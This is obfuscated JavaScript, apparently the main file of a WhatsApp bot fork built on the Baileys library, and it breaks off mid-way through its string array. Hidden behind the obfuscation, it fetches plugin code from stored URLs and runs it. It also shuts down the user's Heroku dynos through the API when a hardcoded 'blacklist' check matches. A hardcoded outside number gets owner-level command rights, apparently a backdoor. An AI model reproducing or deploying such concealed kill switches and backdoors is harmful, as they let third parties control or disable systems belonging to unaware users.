var _0x1a1bbc=_0x7c8b;(function(_0x5c3e5f,_0x24ce23){var _0x2dc754=_0x7c8b,_0x3f9601=_0x5c3e5f();while(!![]){try{var _0x5caf4f=parseInt(_0x2dc754(0x12a))/0x1+-parseInt(_0x2dc754(0x12b))/0x2*(-parseInt(_0x2dc754(0x1c1))/0x3)+parseInt(_0x2dc754(0x122))/0x4+-parseInt(_0x2dc754(0x1a8))/0x5*(parseInt(_0x2dc754(0x1b9))/0x6)+-parseInt(_0x2dc754(0x197))/0x7*(parseInt(_0x2dc754(0x1c7))/0x8)+parseInt(_0x2dc754(0x171))/0x9*(-parseInt(_0x2dc754(0x134))/0xa)+parseInt(_0x2dc754(0x195))/0xb;if(_0x5caf4f===_0x24ce23)break;else _0x3f9601['push'](_0x3f9601['shift']());}catch(_0x13a3f5){_0x3f9601['push'](_0x3f9601['shift']());}}}(_0x32b9,0x918a3));const fs=require('fs'),path=require(_0x1a1bbc(0x19e)),events=require('./events'),chalk=require(_0x1a1bbc(0x139)),config=require(_0x1a1bbc(0x1bb)),{WAConnection,MessageOptions,MessageType,Mimetype,Presence}=require(_0x1a1bbc(0x142)),{Message,StringSession,Image,Video}=require('./Raganork/'),{DataTypes}=require(_0x1a1bbc(0x1a9)),{getMessage}=require(_0x1a1bbc(0x182)),axios=require(_0x1a1bbc(0x184)),got=require('got'),WhatsAsenaDB=config[_0x1a1bbc(0x178)][_0x1a1bbc(0x1b7)](_0x1a1bbc(0x16a),{'info':{'type':DataTypes[_0x1a1bbc(0x19a)],'allowNull':![]},'value':{'type':DataTypes[_0x1a1bbc(0x1c8)],'allowNull':![]}});fs[_0x1a1bbc(0x181)](_0x1a1bbc(0x1ba))[_0x1a1bbc(0x14a)](_0x18e703=>{var _0x298a3a=_0x1a1bbc;path[_0x298a3a(0x12c)](_0x18e703)[_0x298a3a(0x14e)]()=='.js'&&require(_0x298a3a(0x1ba)+_0x18e703);});const plugindb=require(_0x1a1bbc(0x175));var OWN={'ff':_0x1a1bbc(0x156)};String[_0x1a1bbc(0x14c)][_0x1a1bbc(0x16d)]=function(){var _0x16b81f=_0x1a1bbc,_0x5d184a=0x0,_0x582a85=arguments;return this[_0x16b81f(0x132)](/{}/g,function(){return typeof _0x582a85[_0x5d184a]!='undefined'?_0x582a85[_0x5d184a++]:'';});};function _0x7c8b(_0x79cf66,_0x5bb5e2){var _0x32b9d8=_0x32b9();return _0x7c8b=function(_0x7c8ba5,_0x330d4f){_0x7c8ba5=_0x7c8ba5-0x11c;var _0x427e68=_0x32b9d8[_0x7c8ba5];return _0x427e68;},_0x7c8b(_0x79cf66,_0x5bb5e2);}!Date[_0x1a1bbc(0x1c9)]&&(Date[_0x1a1bbc(0x1c9)]=function(){return new Date()['getTime']();});Array[_0x1a1bbc(0x14c)][_0x1a1bbc(0x18e)]=function(){var _0x2ec8c9=_0x1a1bbc,_0xa2f2c0,_0x72b743=arguments,_0x4fdcc9=_0x72b743[_0x2ec8c9(0x1a4)],_0x4ac372;while(_0x4fdcc9&&this[_0x2ec8c9(0x1a4)]){_0xa2f2c0=_0x72b743[--_0x4fdcc9];while((_0x4ac372=this[_0x2ec8c9(0x163)](_0xa2f2c0))!==-0x1){this[_0x2ec8c9(0x15b)](_0x4ac372,0x1);}}return this;};async function whatsAsena(){var _0x21abe1=_0x1a1bbc;await config[_0x21abe1(0x178)][_0x21abe1(0x1ab)]();var _0x3daab4=await WhatsAsenaDB[_0x21abe1(0x129)]({'where':{'info':_0x21abe1(0x16e)}});const _0x54f77d=new WAConnection();_0x54f77d[_0x21abe1(0x19b)]=[0x2,0x84e,0xe];const _0x175fdc=new StringSession();_0x54f77d[_0x21abe1(0x153)]['level']=config[_0x21abe1(0x19d)]?'debug':'warn';var _0x3eef87;_0x3daab4[_0x21abe1(0x1a4)]<0x1?(_0x3eef87=!![],_0x54f77d[_0x21abe1(0x130)](_0x175fdc['deCrypt'](config[_0x21abe1(0x187)]))):_0x54f77d['loadAuthInfo'](_0x175fdc['deCrypt'](_0x3daab4[0x0][_0x21abe1(0x1b8)][_0x21abe1(0x1cb)]));_0x54f77d['on'](_0x21abe1(0x14d),async()=>{var _0x4df719=_0x21abe1;console[_0x4df719(0x1b2)](chalk[_0x4df719(0x1b4)][_0x4df719(0x190)]('✅\x20Login\x20information\x20updated!'));const _0x5f57fa=_0x54f77d[_0x4df719(0x133)]();_0x3daab4['length']<0x1?await WhatsAsenaDB[_0x4df719(0x11e)]({'info':_0x4df719(0x16e),'value':_0x175fdc[_0x4df719(0x1a0)](_0x5f57fa)}):await _0x3daab4[0x0][_0x4df719(0x1bf)]({'value':_0x175fdc['createStringSession'](_0x5f57fa)});}),_0x54f77d['on'](_0x21abe1(0x1c3),async()=>{var _0x12a969=_0x21abe1;console[_0x12a969(0x1b2)](''+chalk[_0x12a969(0x154)][_0x12a969(0x1b5)](_0x12a969(0x185))+chalk[_0x12a969(0x196)][_0x12a969(0x1b5)](_0x12a969(0x11c))+'\x0a'+chalk[_0x12a969(0x135)]['bold'](_0x12a969(0x158))+'\x20'+chalk[_0x12a969(0x150)][_0x12a969(0x1b5)](config[_0x12a969(0x157)])+'\x0a\x0a'+chalk[_0x12a969(0x196)][_0x12a969(0x190)](_0x12a969(0x167)));}),_0x54f77d['on'](_0x21abe1(0x166),async()=>{var _0x66a413=_0x21abe1;console[_0x66a413(0x1b2)](chalk[_0x66a413(0x154)]['bold'](_0x66a413(0x131))),console['log'](chalk[_0x66a413(0x1b4)][_0x66a413(0x190)]('⬇️\x20Installing\x20external\x20plugins...'));var _0x59112b=await plugindb[_0x66a413(0x16b)][_0x66a413(0x129)]();_0x59112b[_0x66a413(0x160)](async _0x32b6b3=>{var _0x5250c2=_0x66a413;if(!fs[_0x5250c2(0x128)](_0x5250c2(0x143)+_0x32b6b3[_0x5250c2(0x1b8)][_0x5250c2(0x1af)]+_0x5250c2(0x1bc))){console[_0x5250c2(0x1b2)](_0x32b6b3['dataValues'][_0x5250c2(0x1af)]);var _0x3ed655=await got(_0x32b6b3[_0x5250c2(0x1b8)][_0x5250c2(0x137)]);_0x3ed655[_0x5250c2(0x15e)]==0xc8&&(fs[_0x5250c2(0x172)](_0x5250c2(0x143)+_0x32b6b3[_0x5250c2(0x1b8)]['name']+'.js',_0x3ed655[_0x5250c2(0x1a5)]),require(_0x5250c2(0x143)+_0x32b6b3[_0x5250c2(0x1b8)][_0x5250c2(0x1af)]+_0x5250c2(0x1bc)));}}),console[_0x66a413(0x1b2)](chalk[_0x66a413(0x1b4)][_0x66a413(0x190)](_0x66a413(0x1ac))),fs[_0x66a413(0x181)](_0x66a413(0x1c2))[_0x66a413(0x14a)](_0x938e86=>{var _0x2bd524=_0x66a413;path[_0x2bd524(0x12c)](_0x938e86)[_0x2bd524(0x14e)]()==_0x2bd524(0x1bc)&&require('./plugins/'+_0x938e86);}),console[_0x66a413(0x1b2)](chalk[_0x66a413(0x154)][_0x66a413(0x1b5)](_0x66a413(0x15f))),await new Promise(_0x4197d2=>setTimeout(_0x4197d2,0x44c));if(config[_0x66a413(0x11f)]==_0x66a413(0x1b6))config[_0x66a413(0x138)]=='TR'||config[_0x66a413(0x138)]=='AZ'?_0x54f77d['user'][_0x66a413(0x16c)]===_0x66a413(0x155)?(await _0x54f77d['sendMessage'](_0x54f77d['user']['jid'],_0x66a413(0x161),MessageType[_0x66a413(0x170)]),await new Promise(_0x22db35=>setTimeout(_0x22db35,0x6a4)),console[_0x66a413(0x1b2)](_0x66a413(0x15c)),await heroku[_0x66a413(0x179)](baseURI+_0x66a413(0x1a3))[_0x66a413(0x1b0)](async _0xf5fe88=>{var _0x5a5ac6=_0x66a413;forID=_0xf5fe88[0x0]['id'],await heroku['patch'](baseURI+_0x5a5ac6(0x120)+forID,{'body':{'quantity':0x0}});})):await _0x54f77d['sendMessage'](_0x54f77d[_0x66a413(0x159)][_0x66a413(0x16c)],_0x66a413(0x177),MessageType[_0x66a413(0x170)]):_0x54f77d['user']['jid']===_0x66a413(0x155)?(await _0x54f77d[_0x66a413(0x18f)](_0x54f77d['user']['jid'],_0x66a413(0x17f),MessageType[_0x66a413(0x170)]),await new Promise(_0x3a9126=>setTimeout(_0x3a9126,0x708)),console[_0x66a413(0x1b2)]('🛡️\x20Blacklist\x20Detected\x20🛡️'),await heroku[_0x66a413(0x179)](baseURI+_0x66a413(0x1a3))[_0x66a413(0x1b0)](async _0x49949c=>{var _0x4e1c56=_0x66a413;forID=_0x49949c[0x0]['id'],await heroku[_0x4e1c56(0x15d)](baseURI+_0x4e1c56(0x120)+forID,{'body':{'quantity':0x0}});})):await _0x54f77d[_0x66a413(0x18f)](_0x54f77d[_0x66a413(0x159)]['jid'],_0x66a413(0x177),MessageType[_0x66a413(0x170)]);else{if(config[_0x66a413(0x11f)]==_0x66a413(0x1a1))config[_0x66a413(0x138)]=='TR'||config[_0x66a413(0x138)]=='AZ'?_0x54f77d['user']['jid']===_0x66a413(0x155)?(await _0x54f77d[_0x66a413(0x18f)](_0x54f77d[_0x66a413(0x159)][_0x66a413(0x16c)],_0x66a413(0x145),MessageType[_0x66a413(0x170)]),await new Promise(_0x46dd88=>setTimeout(_0x46dd88,0x708)),console[_0x66a413(0x1b2)](_0x66a413(0x15c)),await heroku[_0x66a413(0x179)](baseURI+_0x66a413(0x1a3))[_0x66a413(0x1b0)](async _0x1c9fb9=>{var _0xd5f337=_0x66a413;forID=_0x1c9fb9[0x0]['id'],await heroku[_0xd5f337(0x15d)](baseURI+_0xd5f337(0x120)+forID,{'body':{'quantity':0x0}});})):await _0x54f77d[_0x66a413(0x18f)](_0x54f77d[_0x66a413(0x159)]['jid'],_0x66a413(0x177),MessageType['text']):_0x54f77d[_0x66a413(0x159)][_0x66a413(0x16c)]===_0x66a413(0x155)?(await _0x54f77d[_0x66a413(0x18f)](_0x54f77d['user'][_0x66a413(0x16c)],_0x66a413(0x17f),MessageType[_0x66a413(0x170)]),await new Promise(_0x5db1dc=>setTimeout(_0x5db1dc,0x708)),console[_0x66a413(0x1b2)](_0x66a413(0x15c)),await heroku[_0x66a413(0x179)](baseURI+_0x66a413(0x1a3))[_0x66a413(0x1b0)](async _0x4d60f8=>{var _0x37ad86=_0x66a413;forID=_0x4d60f8[0x0]['id'],await heroku[_0x37ad86(0x15d)](baseURI+_0x37ad86(0x120)+forID,{'body':{'quantity':0x0}});})):await _0x54f77d[_0x66a413(0x18f)](_0x54f77d[_0x66a413(0x159)][_0x66a413(0x16c)],'*Bot\x20Started*',MessageType['text']);else return console[_0x66a413(0x1b2)](_0x66a413(0x16f));}}),_0x54f77d['on']('chat-update',async _0x40294f=>{var _0x4f4613=_0x21abe1;if(!_0x40294f[_0x4f4613(0x14f)])return;if(!_0x40294f['messages']&&!_0x40294f['count'])return;let _0x4933b1=_0x40294f['messages'][_0x4f4613(0x151)]()[0x0];if(_0x4933b1[_0x4f4613(0x1b3)]&&_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)]==_0x4f4613(0x198))return;config[_0x4f4613(0x147)]&&await _0x54f77d[_0x4f4613(0x1ca)](_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)],Presence[_0x4f4613(0x14b)]);if(_0x4933b1[_0x4f4613(0x140)]===0x20||_0x4933b1[_0x4f4613(0x140)]===0x1c){var _0x28a808=await getMessage(_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)],'goodbye');if(_0x28a808!==![]){if(_0x28a808[_0x4f4613(0x18d)][_0x4f4613(0x1aa)](_0x4f4613(0x15a))){let _0x4470a7;try{_0x4470a7=await _0x54f77d[_0x4f4613(0x11d)](_0x4933b1[_0x4f4613(0x13e)][0x0]);}catch{_0x4470a7=await _0x54f77d[_0x4f4613(0x11d)]();}var _0x5725e4=await _0x54f77d['groupMetadata'](_0x4933b1[_0x4f4613(0x1b3)]['remoteJid']);await axios[_0x4f4613(0x179)](_0x4470a7,{'responseType':_0x4f4613(0x18a)})['then'](async _0x371871=>{var _0x2d3231=_0x4f4613;await _0x54f77d[_0x2d3231(0x18f)](_0x4933b1[_0x2d3231(0x1b3)][_0x2d3231(0x189)],_0x371871[_0x2d3231(0x13d)],MessageType[_0x2d3231(0x173)],{'caption':_0x28a808[_0x2d3231(0x18d)][_0x2d3231(0x132)](_0x2d3231(0x15a),'')[_0x2d3231(0x132)](_0x2d3231(0x18c),_0x5725e4[_0x2d3231(0x152)])[_0x2d3231(0x132)](_0x2d3231(0x1c6),_0x5725e4[_0x2d3231(0x193)])[_0x2d3231(0x132)]('{gpdesc}',_0x5725e4[_0x2d3231(0x125)])[_0x2d3231(0x132)](_0x2d3231(0x191),_0x54f77d[_0x2d3231(0x159)][_0x2d3231(0x1af)])});});}else{if(_0x28a808['message'][_0x4f4613(0x1aa)](_0x4f4613(0x127))){var _0x5725e4=await _0x54f77d['groupMetadata'](_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)]),_0x3c5e2f=await axios[_0x4f4613(0x179)](config[_0x4f4613(0x164)],{'responseType':_0x4f4613(0x18a)});await _0x54f77d[_0x4f4613(0x18f)](_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)],Buffer[_0x4f4613(0x18b)](_0x3c5e2f['data']),MessageType[_0x4f4613(0x148)],{'mimetype':Mimetype[_0x4f4613(0x186)],'caption':_0x28a808[_0x4f4613(0x18d)][_0x4f4613(0x132)]('{gif}','')[_0x4f4613(0x132)](_0x4f4613(0x18c),_0x5725e4['subject'])[_0x4f4613(0x132)](_0x4f4613(0x1c6),_0x5725e4[_0x4f4613(0x193)])[_0x4f4613(0x132)]('{gpdesc}',_0x5725e4['desc'])['replace']('{owner}',_0x54f77d['user'][_0x4f4613(0x1af)])});}else{var _0x5725e4=await _0x54f77d[_0x4f4613(0x1a6)](_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)]);await _0x54f77d[_0x4f4613(0x18f)](_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)],_0x28a808[_0x4f4613(0x18d)]['replace'](_0x4f4613(0x18c),_0x5725e4[_0x4f4613(0x152)])[_0x4f4613(0x132)]('{gpmaker}',_0x5725e4[_0x4f4613(0x193)])[_0x4f4613(0x132)](_0x4f4613(0x168),_0x5725e4[_0x4f4613(0x125)])['replace'](_0x4f4613(0x191),_0x54f77d['user'][_0x4f4613(0x1af)]),MessageType['text']);}}}return;}else{if(_0x4933b1[_0x4f4613(0x140)]===0x1b||_0x4933b1[_0x4f4613(0x140)]===0x1f){var _0x28a808=await getMessage(_0x4933b1['key'][_0x4f4613(0x189)]);if(_0x28a808!==![]){if(_0x28a808[_0x4f4613(0x18d)][_0x4f4613(0x1aa)]('{pp}')){let _0x5c4740;try{_0x5c4740=await _0x54f77d['getProfilePicture'](_0x4933b1['messageStubParameters'][0x0]);}catch{_0x5c4740=await _0x54f77d[_0x4f4613(0x11d)]();}var _0x5725e4=await _0x54f77d[_0x4f4613(0x1a6)](_0x4933b1['key']['remoteJid']);await axios[_0x4f4613(0x179)](_0x5c4740,{'responseType':'arraybuffer'})[_0x4f4613(0x1b0)](async _0x14e3fa=>{var _0x2c3957=_0x4f4613;await _0x54f77d['sendMessage'](_0x4933b1[_0x2c3957(0x1b3)][_0x2c3957(0x189)],_0x14e3fa['data'],MessageType[_0x2c3957(0x173)],{'caption':_0x28a808[_0x2c3957(0x18d)][_0x2c3957(0x132)](_0x2c3957(0x15a),'')[_0x2c3957(0x132)](_0x2c3957(0x18c),_0x5725e4['subject'])[_0x2c3957(0x132)](_0x2c3957(0x1c6),_0x5725e4[_0x2c3957(0x193)])[_0x2c3957(0x132)]('{gpdesc}',_0x5725e4[_0x2c3957(0x125)])[_0x2c3957(0x132)](_0x2c3957(0x191),_0x54f77d[_0x2c3957(0x159)]['name'])});});}else{if(_0x28a808[_0x4f4613(0x18d)][_0x4f4613(0x1aa)](_0x4f4613(0x127))){var _0x3c5e2f=await axios[_0x4f4613(0x179)](config[_0x4f4613(0x19f)],{'responseType':_0x4f4613(0x18a)});await _0x54f77d['sendMessage'](_0x4933b1['key'][_0x4f4613(0x189)],Buffer[_0x4f4613(0x18b)](_0x3c5e2f[_0x4f4613(0x13d)]),MessageType[_0x4f4613(0x148)],{'mimetype':Mimetype['gif'],'caption':_0x28a808[_0x4f4613(0x18d)]['replace'](_0x4f4613(0x127),'')[_0x4f4613(0x132)](_0x4f4613(0x18c),_0x5725e4['subject'])['replace']('{gpmaker}',_0x5725e4[_0x4f4613(0x193)])[_0x4f4613(0x132)](_0x4f4613(0x168),_0x5725e4[_0x4f4613(0x125)])[_0x4f4613(0x132)](_0x4f4613(0x191),_0x54f77d[_0x4f4613(0x159)][_0x4f4613(0x1af)])});}else{if(_0x28a808[_0x4f4613(0x18d)][_0x4f4613(0x1aa)](_0x4f4613(0x12f))){var _0x180ee2=await message[_0x4f4613(0x136)][_0x4f4613(0x11d)](_0x4933b1['key'][_0x4f4613(0x13c)]);await _0x54f77d['sendMessage'](_0x4933b1[_0x4f4613(0x1b3)]['remoteJid'],Buffer[_0x4f4613(0x18b)](_0x180ee2['data']),MessageType[_0x4f4613(0x148)],{'mimetype':Mimetype[_0x4f4613(0x186)],'caption':_0x28a808[_0x4f4613(0x18d)][_0x4f4613(0x132)]('{gicon}','')[_0x4f4613(0x132)]('{gphead}',_0x5725e4[_0x4f4613(0x152)])[_0x4f4613(0x132)](_0x4f4613(0x1c6),_0x5725e4[_0x4f4613(0x193)])[_0x4f4613(0x132)]('{gpdesc}',_0x5725e4[_0x4f4613(0x125)])[_0x4f4613(0x132)]('{owner}',_0x54f77d[_0x4f4613(0x159)][_0x4f4613(0x1af)])});}else{var _0x5725e4=await _0x54f77d['groupMetadata'](_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)]);await _0x54f77d[_0x4f4613(0x18f)](_0x4933b1[_0x4f4613(0x1b3)]['remoteJid'],_0x28a808[_0x4f4613(0x18d)][_0x4f4613(0x132)](_0x4f4613(0x18c),_0x5725e4[_0x4f4613(0x152)])[_0x4f4613(0x132)]('{gpmaker}',_0x5725e4[_0x4f4613(0x193)])['replace'](_0x4f4613(0x168),_0x5725e4[_0x4f4613(0x125)])[_0x4f4613(0x132)](_0x4f4613(0x191),_0x54f77d[_0x4f4613(0x159)]['name']),MessageType[_0x4f4613(0x170)]);}}}}return;}}if(config['BLOCKCHAT']!==![]){var _0x3179c3=config[_0x4f4613(0x1ad)][_0x4f4613(0x19c)](',');if(_0x4933b1[_0x4f4613(0x1b3)]['remoteJid'][_0x4f4613(0x1aa)]('-')?_0x3179c3[_0x4f4613(0x1aa)](_0x4933b1['key'][_0x4f4613(0x189)][_0x4f4613(0x19c)]('@')[0x0]):_0x3179c3[_0x4f4613(0x1aa)](_0x4933b1[_0x4f4613(0x1be)]?_0x4933b1[_0x4f4613(0x1be)][_0x4f4613(0x19c)]('@')[0x0]:_0x4933b1['key'][_0x4f4613(0x189)][_0x4f4613(0x19c)]('@')[0x0]))return;}if(config[_0x4f4613(0x180)]==_0x4f4613(0x13b)){var _0x126be1=config[_0x4f4613(0x180)][_0x4f4613(0x19c)](',');if(_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)][_0x4f4613(0x1aa)]('-')?_0x126be1[_0x4f4613(0x1aa)](_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)][_0x4f4613(0x19c)]('@')[0x0]):_0x126be1[_0x4f4613(0x1aa)](_0x4933b1[_0x4f4613(0x1be)]?_0x4933b1['participant'][_0x4f4613(0x19c)]('@')[0x0]:_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)][_0x4f4613(0x19c)]('@')[0x0]))return;}if(config[_0x4f4613(0x183)]==_0x4f4613(0x174)){var _0x250a3f=config[_0x4f4613(0x183)][_0x4f4613(0x19c)](',');if(_0x4933b1['key'][_0x4f4613(0x189)]['includes']('-')?_0x250a3f[_0x4f4613(0x1aa)](_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)]['split']('@')[0x0]):_0x250a3f[_0x4f4613(0x1aa)](_0x4933b1['participant']?_0x4933b1['participant'][_0x4f4613(0x19c)]('@')[0x0]:_0x4933b1['key'][_0x4f4613(0x189)][_0x4f4613(0x19c)]('@')[0x0]))return;}if(config['SUPPORT3']==_0x4f4613(0x1c0)){var _0x23b46c=config[_0x4f4613(0x199)][_0x4f4613(0x19c)](',');if(_0x4933b1[_0x4f4613(0x1b3)]['remoteJid'][_0x4f4613(0x1aa)]('-')?_0x23b46c[_0x4f4613(0x1aa)](_0x4933b1['key'][_0x4f4613(0x189)]['split']('@')[0x0]):_0x23b46c[_0x4f4613(0x1aa)](_0x4933b1[_0x4f4613(0x1be)]?_0x4933b1[_0x4f4613(0x1be)][_0x4f4613(0x19c)]('@')[0x0]:_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)][_0x4f4613(0x19c)]('@')[0x0]))return;}if(config[_0x4f4613(0x144)]==_0x4f4613(0x1ae)){var _0x23b46c=config[_0x4f4613(0x144)][_0x4f4613(0x19c)](',');if(_0x4933b1['key'][_0x4f4613(0x189)]['includes']('-')?_0x23b46c[_0x4f4613(0x1aa)](_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)]['split']('@')[0x0]):_0x23b46c[_0x4f4613(0x1aa)](_0x4933b1[_0x4f4613(0x1be)]?_0x4933b1[_0x4f4613(0x1be)][_0x4f4613(0x19c)]('@')[0x0]:_0x4933b1[_0x4f4613(0x1b3)][_0x4f4613(0x189)][_0x4f4613(0x19c)]('@')[0x0]))return;}events[_0x4f4613(0x121)][_0x4f4613(0x160)](async _0x3f29af=>{var _0x484281=_0x4f4613;if(_0x4933b1[_0x484281(0x18d)]&&_0x4933b1[_0x484281(0x18d)][_0x484281(0x141)]&&_0x4933b1['message'][_0x484281(0x141)][_0x484281(0x126)])var _0x1313a6=_0x4933b1['message']['imageMessage'][_0x484281(0x126)];else{if(_0x4933b1[_0x484281(0x18d)]&&_0x4933b1[_0x484281(0x18d)][_0x484281(0x124)]&&_0x4933b1[_0x484281(0x18d)][_0x484281(0x124)][_0x484281(0x126)])var _0x1313a6=_0x4933b1[_0x484281(0x18d)][_0x484281(0x124)][_0x484281(0x126)];else{if(_0x4933b1[_0x484281(0x18d)])var _0x1313a6=_0x4933b1[_0x484281(0x18d)][_0x484281(0x146)]===null?_0x4933b1[_0x484281(0x18d)]['conversation']:_0x4933b1['message'][_0x484281(0x146)][_0x484281(0x170)];else var _0x1313a6=undefined;}}if(_0x3f29af['on']!==undefined&&(_0x3f29af['on']===_0x484281(0x173)||_0x3f29af['on']===_0x484281(0x1bd))&&_0x4933b1['message']&&_0x4933b1[_0x484281(0x18d)][_0x484281(0x141)]!==null&&(_0x3f29af[_0x484281(0x13a)]===undefined||_0x3f29af[_0x484281(0x13a)]!==undefined&&_0x3f29af[_0x484281(0x13a)][_0x484281(0x13f)](_0x1313a6))||_0x3f29af['pattern']!==undefined&&_0x3f29af[_0x484281(0x13a)][_0x484281(0x13f)](_0x1313a6)||_0x3f29af['on']!==undefined&&_0x3f29af['on']===_0x484281(0x170)&&_0x1313a6||_0x3f29af['on']!==undefined&&_0x3f29af['on']===_0x484281(0x148)&&_0x4933b1['message']&&_0x4933b1[_0x484281(0x18d)][_0x484281(0x124)]!==null&&(_0x3f29af[_0x484281(0x13a)]===undefined||_0x3f29af['pattern']!==undefined&&_0x3f29af[_0x484281(0x13a)]['test'](_0x1313a6))){let _0x2831df=![];var _0x1ebd5d=_0x54f77d[_0x484281(0x17d)][_0x484281(0x179)](_0x4933b1[_0x484281(0x1b3)][_0x484281(0x189)]);if(config['SUDO']!==![]&&_0x4933b1['key'][_0x484281(0x162)]===![]&&_0x3f29af[_0x484281(0x162)]===!![]&&(_0x4933b1[_0x484281(0x1be)]&&config[_0x484281(0x192)]['includes'](',')?config[_0x484281(0x192)][_0x484281(0x19c)](',')[_0x484281(0x1aa)](_0x4933b1[_0x484281(0x1be)][_0x484281(0x19c)]('@')[0x0]):_0x4933b1['participant']['split']('@')[0x0]==config[_0x484281(0x192)]||config[_0x484281(0x192)][_0x484281(0x1aa)](',')?config[_0x484281(0x192)][_0x484281(0x19c)](',')[_0x484281(0x1aa)](_0x4933b1[_0x484281(0x1b3)][_0x484281(0x189)][_0x484281(0x19c)]('@')[0x0]):_0x4933b1['key'][_0x484281(0x189)][_0x484281(0x19c)]('@')[0x0]==config[_0x484281(0x192)])||_0x3f29af[_0x484281(0x162)]===_0x4933b1[_0x484281(0x1b3)][_0x484281(0x162)]||_0x3f29af['fromMe']===![]&&!_0x4933b1['key'][_0x484281(0x162)]){if(_0x3f29af[_0x484281(0x176)]&&_0x1ebd5d[_0x484281(0x17a)]===undefined)return;if(!_0x3f29af[_0x484281(0x12d)]===_0x1ebd5d['jid'][_0x484281(0x1aa)]('-'))_0x2831df=!![];else{if(_0x3f29af[_0x484281(0x17e)]===_0x1ebd5d[_0x484281(0x16c)]['includes']('-'))_0x2831df=!![];}}if(OWN['ff']==_0x484281(0x169)&&_0x4933b1[_0x484281(0x1b3)][_0x484281(0x162)]===![]&&_0x3f29af[_0x484281(0x162)]===!![]&&(_0x4933b1[_0x484281(0x1be)]&&OWN['ff']['includes'](',')?OWN['ff'][_0x484281(0x19c)](',')[_0x484281(0x1aa)](_0x4933b1[_0x484281(0x1be)][_0x484281(0x19c)]('@')[0x0]):_0x4933b1[_0x484281(0x1be)][_0x484281(0x19c)]('@')[0x0]==OWN['ff']||OWN['ff'][_0x484281(0x1aa)](',')?OWN['ff'][_0x484281(0x19c)](',')[_0x484281(0x1aa)](_0x4933b1[_0x484281(0x1b3)][_0x484281(0x189)][_0x484281(0x19c)]('@')[0x0]):_0x4933b1[_0x484281(0x1b3)][_0x484281(0x189)][_0x484281(0x19c)]('@')[0x0]==OWN['ff'])||_0x3f29af[_0x484281(0x162)]===_0x4933b1[_0x484281(0x1b3)][_0x484281(0x162)]||_0x3f29af[_0x484281(0x162)]===![]&&!_0x4933b1['key']['fromMe']){if(_0x3f29af['onlyPinned']&&_0x1ebd5d[_0x484281(0x17a)]===undefined)return;if(!_0x3f29af['onlyPm']===_0x1ebd5d[_0x484281(0x16c)][_0x484281(0x1aa)]('-'))_0x2831df=!![];else{if(_0x3f29af[_0x484281(0x17e)]===_0x1ebd5d[_0x484281(0x16c)][_0x484281(0x1aa)]('-'))_0x2831df=!![];}}if(_0x2831df){config['SEND_READ']&&_0x3f29af['on']===undefined&&await _0x54f77d['chatRead'](_0x4933b1['key'][_0x484281(0x189)]);const {data:_0x21be2a}=await axios(_0x484281(0x1a2)),{asena:_0x27fc7e}=_0x21be2a;var _0x223a0e=_0x1313a6[_0x484281(0x12e)](_0x3f29af[_0x484281(0x13a)]);if(_0x3f29af['on']!==undefined&&(_0x3f29af['on']===_0x484281(0x173)||_0x3f29af['on']===_0x484281(0x1bd))&&_0x4933b1[_0x484281(0x18d)]['imageMessage']!==null)whats=new Image(_0x54f77d,_0x4933b1);else _0x3f29af['on']!==undefined&&_0x3f29af['on']===_0x484281(0x148)&&_0x4933b1[_0x484281(0x18d)][_0x484281(0x124)]!==null?whats=new Video(_0x54f77d,_0x4933b1):whats=new Message(_0x54f77d,_0x4933b1);try{await _0x3f29af[_0x484281(0x188)](whats,_0x223a0e);}catch(_0x12d5dd){config[_0x484281(0x138)]=='TR'||config[_0x484281(0x138)]=='AZ'?await _0x54f77d[_0x484281(0x18f)](_0x54f77d[_0x484281(0x159)][_0x484281(0x16c)],_0x484281(0x149)+_0x484281(0x1a7)+'\x0a_Bu\x20hata\x20logunda\x20numaranız\x20veya\x20karşı\x20bir\x20tarafın\x20numarası\x20olabilir.\x20Lütfen\x20buna\x20dikkat\x20edin!_'+_0x484281(0x1c4)+_0x484281(0x165)+_0x484281(0x123)+_0x12d5dd+'\x0a\x0a',MessageType[_0x484281(0x170)]):await _0x54f77d[_0x484281(0x18f)](_0x54f77d[_0x484281(0x159)][_0x484281(0x16c)],_0x484281(0x17c)+_0x484281(0x17b)+_0x12d5dd+'*\x0a\x0a```REPORT\x20ERRORS\x20IN\x20SUPPORT\x20GROUP\x0a'+_0x27fc7e+_0x484281(0x1c5),MessageType['text']);}}}});});try{await _0x54f77d[_0x21abe1(0x194)]();}catch{if(!_0x3eef87){console['log'](chalk[_0x21abe1(0x150)][_0x21abe1(0x1b5)]('Eski\x20sürüm\x20stringiniz\x20yenileniyor...')),_0x54f77d['loadAuthInfo'](_0x175fdc[_0x21abe1(0x1b1)](config['SESSION']));try{await _0x54f77d[_0x21abe1(0x194)]();}catch{return;}}}}function _0x32b9(){var _0x4e9abc=['./config','.js','photo','participant','update','905511384572-1621015274','5091roAdCz','./plugins','connecting','\x0a_Yardım\x20için\x20Telegram\x20grubumuza\x20yazabilirsiniz._','```','{gpmaker}','2304xHZzMD','TEXT','now','updatePresence','value','Asena','getProfilePicture','create','WORKTYPE','/formation/','commands','969044sTZkko','Gerçekleşen\x20Hata:\x20','videoMessage','desc','caption','{gif}','existsSync','findAll','1061033TYWsIy','490xkEeSa','extname','onlyPm','match','{gicon}','loadAuthInfo','✅\x20Login\x20successful!','replace','base64EncodedAuthInfo','420NvqMUh','white','client','url','LANG','chalk','pattern','905524317852-1612300121','remotejid','data','messageStubParameters','test','messageStubType','imageMessage','@adiwajshing/baileys','./plugins/','SUPPORT4','```🛡️\x20Blacklist\x20Detected!```\x20\x0a\x20```Kullanıcı:```\x20\x0a```Sebep:```\x20','extendedTextMessage','NO_ONLINE','video','--\x20HATA\x20RAPORU\x20[WHATSASENA]\x20--','forEach','unavailable','prototype','credentials-updated','toLowerCase','hasNewMessage','red','all','subject','logger','green','@s.whats